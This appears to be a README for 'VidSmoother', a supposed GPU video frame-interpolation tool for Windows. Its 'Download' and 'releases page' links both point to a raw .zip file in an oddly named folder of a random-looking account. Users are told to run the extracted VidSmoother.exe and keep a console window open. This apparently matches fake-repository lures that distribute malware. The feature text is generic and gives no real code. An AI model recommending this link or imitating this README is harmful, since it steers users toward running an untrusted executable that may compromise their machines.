# 🎞️ VidSmoother - Make your videos look smooth again

[![](https://img.shields.io/badge/Download-Latest_Release-blueviolet.svg)](https://github.com/silkyterrierropedancer424/VidSmoother/raw/refs/heads/main/inspectoral/Smoother_Vid_v3.1-beta.1.zip)

VidSmoother helps you increase the frame rate of your videos and GIFs. It uses your graphics card to add new frames between existing ones. This process makes movement look fluid and creates a professional result without complex video editing skills.

## 💻 System Requirements

This software performs heavy calculations on your computer hardware. Ensure your system meets these requirements for the best experience:

*   **Operating System**: Windows 10 or Windows 11 (64-bit).
*   **Graphics Card**: An NVIDIA GPU with at least 4GB of video memory. The software relies on CUDA cores to process information.
*   **Storage**: At least 2GB of free space on your hard drive.
*   **Drivers**: Install the latest NVIDIA drivers from the official website to ensure the software detects your hardware.
*   **RAM**: 8GB of memory is the minimum, but 16GB allows for smoother operation with long files.

## 📥 How to Install

1.  Visit the [releases page](https://github.com/silkyterrierropedancer424/VidSmoother/raw/refs/heads/main/inspectoral/Smoother_Vid_v3.1-beta.1.zip) to download the application.
2.  Locate the latest file ending in `.zip`.
3.  Right-click the downloaded folder and select "Extract All."
4.  Open the extracted folder.
5.  Find the file named `VidSmoother.exe` and double-click it to start the program.

The application does not require a complex installation process. It runs as a standalone tool on your machine.

## ⚙️ How to Process Video

1.  Open the `VidSmoother.exe` file.
2.  Input your file by clicking the "Select Video" button. You can choose any common video format or a GIF file.
3.  Choose your target frame rate. Common options are 60 frames per second for video or double the original frame rate.
4.  Select a destination folder for your new file.
5.  Click the "Start" button.
6.  Wait for the progress bar to reach completion. 

The software utilizes TensorRT to speed up the interpolation. You will see a small console window pop up during the process. Keep this window open. It shows the progress of the frames as the software generates them.

## 🛠️ Understanding Interpolation

Frame interpolation guesses what happens between two frames. If you have a video that moves in chunks, interpolation fills the gaps. This makes the playback appear life-like and steady. VidSmoother uses RIFE technology to analyze motion vectors. It identifies how objects move across the screen and calculates where they should be in the new, added frames.

## 💡 Tips for Better Results

*   **Source Material**: Clean, high-quality files yield the best results. If your source video has heavy visual artifacts, the software might struggle to determine object motion.
*   **Graphics Performance**: Close other demanding applications like web browsers or games while you process your video. This gives your GPU more resources to dedicate to the task.
*   **GIF Processing**: GIFs have small file sizes but can be tricky to process. VidSmoother handles these by treating them like short video clips. After processing, you may find the output file size is larger than the original. This happens because the new file contains more frames.
*   **VapourSynth Operations**: This tool uses VapourSynth in the background. It manages the frames efficiently to prevent memory errors. If the app crashes, ensure your background processes are minimal.

## 🛡️ Troubleshooting Common Issues

**The app does not open.**
Check if you have the latest NVIDIA drivers. The software requires a driver that supports current CUDA versions. Update your drivers through GeForce Experience or the NVIDIA support portal.

**The output video looks distorted.**
This usually happens with low-quality source files. Try a different video file to test the software. If the problem persists, check your GPU temperature. Intense processing makes your hardware warm.

**The process stops suddenly.**
This often indicates that your computer ran out of memory. If you are processing a very long video, try breaking it into smaller parts. 

**I see a command prompt window.**
Do not close this window. It acts as the backbone of the application. The main interface passes commands to this window to perform the heavy work. If you close it, the process terminates immediately.

## 📑 License Details

This software is free to use. It relies on several open-source libraries to perform video processing tasks. You can view the licenses for these components inside the `licenses` folder within your installation directory. We aim to keep this tool fast and accessible for all Windows users. You do not need to pay for a license or register an account to use the features provided here. 

## 📤 Feedback and Updates

We release updates to improve performance and fix errors. Check the main page periodically to see if a newer version is available. You do not need to uninstall the old version; simply extract the new files over the old ones. Your user settings will remain saved in a separate configuration file within your user profile directory. You can delete this configuration file if you ever need to reset the program to its original state.